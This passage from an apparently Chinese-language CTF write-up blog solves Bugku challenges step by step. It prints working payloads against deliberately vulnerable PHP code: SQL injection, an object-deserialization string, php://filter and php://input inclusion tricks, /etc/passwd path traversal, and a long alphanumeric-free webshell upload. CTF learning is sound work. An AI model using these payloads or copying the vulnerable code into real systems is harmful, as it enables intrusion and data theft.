<p>其中的%d会从1一直进行递增,表示这是当前进程中第几个匿名函数.因此如果开启一个新的php进程,那么这个匿名函数就是\x00lambda_1,所以思路就是通过向Pre-fork模式的apache服务器发送大量请求,致使apache开启新的进程来处理请求,那么luck=%00lambda_1就可以执行函数了</p>
</blockquote>
<p>我还是觉得简单粗暴点好理解</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">for i in range(1,10000):</span><br><span class="line">        url = &apos;http://45.76.173.177:23334/?func_name=%00lambda_&apos;+str(i)</span><br><span class="line">        c = s.get(url).text</span><br><span class="line">        if &apos;flag&apos; in c:</span><br><span class="line">                print(c)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/07/29/5b5d2efb6906a.png" alt="s24.png"></p>
<p>跑出来的时候差点忘了是哪个题</p>
<h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &apos;db.inc.php&apos;;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">	if(get_magic_quotes_gpc())&#123;</span><br><span class="line">		$str=stripslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line">	return htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[&apos;username&apos;]);</span><br><span class="line">$password = @clean((string)$_GET[&apos;password&apos;]);</span><br><span class="line"></span><br><span class="line">$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span><br><span class="line">	die(&apos;Invalid password!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag;</span><br></pre></td></tr></table></figure>
<p>首先</p>
<p>htmlentities() 函数把字符转换为 HTML 实体</p>
<p>ENT_QUOTES - 编码双引号和单引号</p>
<p>我还傻傻用了半天单引号</p>
<p>payload: <code>?username=1\&amp;password=or%201=1%23</code></p>
<p>语句就是：</p>
<p><code>SELECT * FROM users WHERE name=&#39;1\&#39; AND pass=&#39;or 1=1#&#39;;</code></p>
<p>相当于<code>SELECT * FROM users WHERE name=&#39;xxx&#39;or 1=1#&#39;;</code></p>
<p><code>nctf{sql_injection_is_interesting}</code></p>
<h3 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h3><p>please input a</p>
<p>根据题目，随便0e开头的md5的字符串</p>
<p>paylaod: <code>?a=s878926199a</code></p>
<p><code>flag{md5_collision_is_easy}</code></p>
<h3 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h3><p><a href="http://ctf5.shiyanbar.com/misc/angrybird.jpg" target="_blank" rel="noopener">解题链接： http://ctf5.shiyanbar.com/misc/angrybird.jpg</a></p>
<p>用outguess这个工具才能得到flag</p>
<p>win下exe安装失败</p>
<p>下载源码，编译</p>
<p>附上下载链接<a href="https://codeload.github.com/crorvick/outguess/zip/master" target="_blank" rel="noopener">https://codeload.github.com/crorvick/outguess/zip/master</a></p>
<p>解密: </p>
<p><code>outguess -r angrybird.jpg x.txt</code></p>
<p><code>flag{0ut_Gas}</code></p>
<h3 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h3><p><a href="解题链接： http://ctf5.shiyanbar.com/misc/snake.jpg">解题链接： http://ctf5.shiyanbar.com/misc/snake.jpg</a></p>
<p>binwalk分析，foremost分离</p>
<p>zip包中含有cipher和key文件，key经base64解码为</p>
<p>What is Nicki Minaj’s favorite song that refers to snakes?</p>
<p>Nicki Minaj有首叫anaconda的歌，和snake有点关系</p>
<p>不过没想到要用serpent解密，serpent也有蛇的意思</p>
<p><a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">http://serpent.online-domain-tools.com/</a></p>
<p>类似的加密：</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2efb6610c.png" alt="s262.png"></p>
<p>anaconda就是key了</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2efb3696e.png" alt="s25.png"></p>
<p><code>CTF{who_knew_serpent_cipher_existed}</code></p>
<p>#0x04</p>
<h3 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$pass = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line">    include($file); //hint.php  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>txt直接GET传入好像不行</p>
<p><code>include($file)</code>处的包含可以用php://filter获取php页面源码,但是flag.php是读不了的</p>
<p><code>?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php&amp;password=1</code></p>
<p>hint.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>password则利用反序列化，把Flag的file值赋为flag.php</p>
<p>构造<code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>
<p><code>file=hint.php</code>里有Flag类</p>
<p>payload： <code>?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2efb0334e.png" alt="s29.png"></p>
<h3 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h3><p><img src="https://i.loli.net/2018/07/29/5b5d2efb3384e.png" alt="s30.png"></p>
<p>没有什么多的提示</p>
<p>python，写个5位字典，burp爆破即可</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2efb34fd6.png" alt="s31.png"></p>
<p>13579</p>
<p><code>flag{bugku-baopo-hah}</code></p>
<h3 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h3><p>源码里提示1p.html</p>
<p>一个可以的js，里面一段base64，解码之后再urldecode</p>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">if(!$_GET[&apos;id&apos;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&apos;Location: hello.php?id=1&apos;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$a=$_GET[&apos;a&apos;];</span><br><span class="line">$b=$_GET[&apos;b&apos;];</span><br><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;no no no no no no no&apos;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">	require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>%00使eregi终止，id利用弱类型,字母绕过</p>
<p>payload: <code>?id=a&amp;a=php://input&amp;b=%001111111</code></p>
<p><code>flag{tHis_iS_THe_fLaG}</code></p>
<h3 id="好多压缩包"><a href="#好多压缩包" class="headerlink" title="好多压缩包"></a>好多压缩包</h3><p>解压之后六十多个zip包，不是伪加密，也没爆出密码</p>
<p>然后没了头绪，跟wp学一波</p>
<p>果然要crc碰撞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import zipfile</span><br><span class="line">import string</span><br><span class="line">import binascii</span><br><span class="line"> </span><br><span class="line">def CrackCrc(crc):</span><br><span class="line">    for i in dic:</span><br><span class="line">        for j in dic:</span><br><span class="line">            for p in dic:</span><br><span class="line">                for q in dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    if crc == (binascii.crc32(s) &amp; 0xffffffff):</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        return</span><br><span class="line"> </span><br><span class="line">def CrackZip():</span><br><span class="line">    for I in range(68):</span><br><span class="line">        file = &apos;out&apos; + str(I) + &apos;.zip&apos;</span><br><span class="line">        f = zipfile.ZipFile(file, &apos;r&apos;)</span><br><span class="line">        GetCrc = f.getinfo(&apos;data.txt&apos;)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"> </span><br><span class="line">dic = string.ascii_letters + string.digits + &apos;+/=&apos;</span><br><span class="line"> </span><br><span class="line">f = open(&apos;out.txt&apos;, &apos;w&apos;)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>然后将得到的base64解码，有flag字样，似乎是一个压缩包</p>
<p>这里太坑了，要用notepad++的base64插件解码再保存才能看到RAR文件的结尾标志C43D7B00400700</p>
<p>然后加上标志头526172211A0700，打开</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d68f5246a2.png" alt="s33.png"></p>
<p><code>flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}</code></p>
<h3 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h3><p>图片里有着一大段16进制数据</p>
<p>xxd命令处理，在重定向到输出文件</p>
<p>得到坐标</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d7095709da.png" alt="s34.png"></p>
<p>不太会脚本处理，用gnuplot工具输出二维码</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d712c74ffd.png" alt="s35.png"></p>
<p><code>flag{40fc0a979f759c8892f4dc045e28b820}</code></p>
<h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><h3 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h3><p>看url：<a href="http://120.24.86.145:8002/webshell/" target="_blank" rel="noopener">http://120.24.86.145:8002/webshell/</a></p>
<p>那应该有个shell什么的</p>
<p>果然有个shell.php, 但要密码，整了一个cheetah来shell爆破</p>
<p><a href="https://github.com/sunnyelf/cheetah" target="_blank" rel="noopener">https://github.com/sunnyelf/cheetah</a></p>
<p>一百万的字典没爆出来，可能这不是个真正的shell吧</p>
<p>看wp密码是hack，然后显示flag，果然不是真shell</p>
<p>应该用burp的</p>
<p><code>flag{hack_bug_ku035}</code></p>
<h3 id="流量分析-cnss"><a href="#流量分析-cnss" class="headerlink" title="流量分析(cnss)"></a>流量分析(cnss)</h3><p>数据包很少，但也没什么明显的线索</p>
<p>追踪流的时候总有Referer: <a href="http://space.bilibili.com/17190571/" target="_blank" rel="noopener">http://space.bilibili.com/17190571/</a></p>
<p>进去页面发现base64字符串，解码获取flag</p>
<p><code>cnss{b1libil1_A_gay_wEbsite}</code></p>
<h3 id="简单的waf"><a href="#简单的waf" class="headerlink" title="简单的waf"></a>简单的waf</h3><p>bugku刚上没多久，一开始题目有问题，写入的shell访问不了，然后给admin发了邮件才解决<code>_(:3 」∠)_</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, &quot;On&quot;); </span><br><span class="line">error_reporting(E_ALL | E_STRICT); </span><br><span class="line">if(!isset($_GET[&apos;content&apos;]))&#123; </span><br><span class="line">   show_source(__FILE__); </span><br><span class="line">   die(); </span><br><span class="line">&#125; </span><br><span class="line">function rand_string( $length ) &#123; </span><br><span class="line">   $chars = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;     </span><br><span class="line">   $size = strlen( $chars ); </span><br><span class="line">   $str = &apos;&apos;; </span><br><span class="line">   for( $i = 0; $i &lt; $length; $i++) &#123; </span><br><span class="line">       $str .= $chars[ rand( 0, $size - 1 ) ]; </span><br><span class="line">   &#125; </span><br><span class="line">   return $str; </span><br><span class="line">&#125; </span><br><span class="line">$data = $_GET[&apos;content&apos;]; </span><br><span class="line">$black_char = array(&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;, &apos;g&apos;, &apos;h&apos;, &apos;i&apos;, &apos;j&apos;, &apos;k&apos;, &apos;l&apos;, &apos;m&apos;, &apos;n&apos;, &apos;o&apos;, &apos;p&apos;, &apos;q&apos;, &apos;r&apos;, &apos;s&apos;, &apos;t&apos;, &apos;u&apos;, &apos;v&apos;, &apos;w&apos;, &apos;x&apos;, &apos;y&apos;, &apos;z&apos;,&apos; &apos;, &apos;!&apos;, &apos;&quot;&apos;, &apos;#&apos;, &apos;%&apos;, &apos;&amp;&apos;, &apos;*&apos;, &apos;,&apos;, &apos;-&apos;, &apos;/&apos;, &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;, &apos;:&apos;, &apos;&lt;&apos;, &apos;&gt;&apos;, &apos;?&apos;, &apos;@&apos;, &apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;, &apos;E&apos;, &apos;F&apos;, &apos;G&apos;, &apos;H&apos;, &apos;I&apos;, &apos;J&apos;, &apos;K&apos;, &apos;L&apos;, &apos;M&apos;, &apos;N&apos;, &apos;O&apos;, &apos;P&apos;, &apos;Q&apos;, &apos;R&apos;, &apos;S&apos;, &apos;T&apos;, &apos;U&apos;, &apos;V&apos;, &apos;W&apos;, &apos;X&apos;, &apos;Y&apos;, &apos;Z&apos;, &apos;\\&apos;, &apos;^&apos;, &apos;`&apos;,  &apos;|&apos;, &apos;~&apos;);</span><br><span class="line">foreach ($black_char as $b) &#123; </span><br><span class="line">   if (stripos($data, $b) !== false)&#123; </span><br><span class="line">       die(&quot;鍏抽敭瀛梂AF&quot;); </span><br><span class="line">   &#125; </span><br><span class="line">&#125; </span><br><span class="line">$filename=rand_string(0x20).&apos;.php&apos;; </span><br><span class="line">$folder=&apos;uploads/&apos;; </span><br><span class="line">$full_filename = $folder.$filename; </span><br><span class="line">if(file_put_contents($full_filename, &apos;&lt;?php &apos;.$data))&#123; </span><br><span class="line">   echo &quot;&lt;a href=&apos;&quot;.$full_filename.&quot;&apos;&gt;shell&lt;/a&gt;&lt;/br&gt;&quot;; </span><br><span class="line">   echo &quot;鎴戠殑/flag,浣犺鍒颁簡涔�&quot;; </span><br><span class="line">&#125;else&#123; </span><br><span class="line">   echo &quot;鍣� 鍣�,閿欎簡&quot;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题是github上整理的代码审计中的一道<a href="https://github.com/CHYbeta/Code-Audit-Challenges#php" target="_blank" rel="noopener">https://github.com/CHYbeta/Code-Audit-Challenges#php</a></p>
<p>大佬们的绕过姿势：</p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#_4" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a></p>
<p><a href="http://www.jianshu.com/p/d23d4b1358f2" target="_blank" rel="noopener">php特殊webshell(无数字,字母,位运算)</a></p>
<p><a href="https://chybeta.github.io/2017/07/15/一道好玩的webshell题/" target="_blank" rel="noopener">一道好玩的webshell题</a></p>
<p>其思路就是利用字符串ARRAY获取字符A，利用php的特性，从A递增获得A到Z的各个字母。原webshell存在”修改其webshell</p>
<p><code>+</code>要url编码为%2b</p>
<p><code>http://120.24.86.145:9010/?content=$_=&#39;&#39;;$_[%2b$_]%2b%2b;$_=$_.&#39;&#39;;$__=$_[%2b&#39;&#39;];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=&#39;_&#39;;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]);</code></p>
<p>获得shell的url后，上菜刀就行</p>
<p><img src="https://i.loli.net/2018/07/31/5b60254b13ea2.png" alt="s1.png"></p>
<h3 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h3><p>pcapng文件，Wireshark打不开，文件错误</p>
<p>对比文件头，没修改成功</p>
<p>直接搜索flag</p>
<p><img src="https://i.loli.net/2018/08/01/5b616683c9373.png" alt="s2.png"></p>
<h3 id="Do-you-know-upload？"><a href="#Do-you-know-upload？" class="headerlink" title="Do you know upload？"></a>Do you know upload？</h3><p>有个提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line">include($_GET[&apos;file&apos;]); </span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<p>这里可以用<code>file=../../../../../../../../etc/passwd</code>读文件</p>
<p>并没有找到flag文件</p>
<p>使用<br><code>php://filter/read=convert.base64-encode/resource=index.php</code><br>查看源码</p>
<p>其中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include($_GET[&apos;file&apos;]); </span><br><span class="line">@$pic = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">@$pics = explode(&apos;.&apos; , $pic);</span><br><span class="line"></span><br><span class="line">if(@isset($_POST[submit]))&#123;</span><br><span class="line">    if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)</span><br><span class="line">            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)</span><br><span class="line">            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)))&#123;</span><br><span class="line"></span><br><span class="line">        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;</span><br><span class="line">            echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">            echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">            echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;</span><br><span class="line">            //echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">            if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;</span><br><span class="line">                echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">                    &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">                echo &quot;Stored in: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&apos;文件类型不允许&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">        echo &quot;Invalid file&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    // echo &quot;Invalid file&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
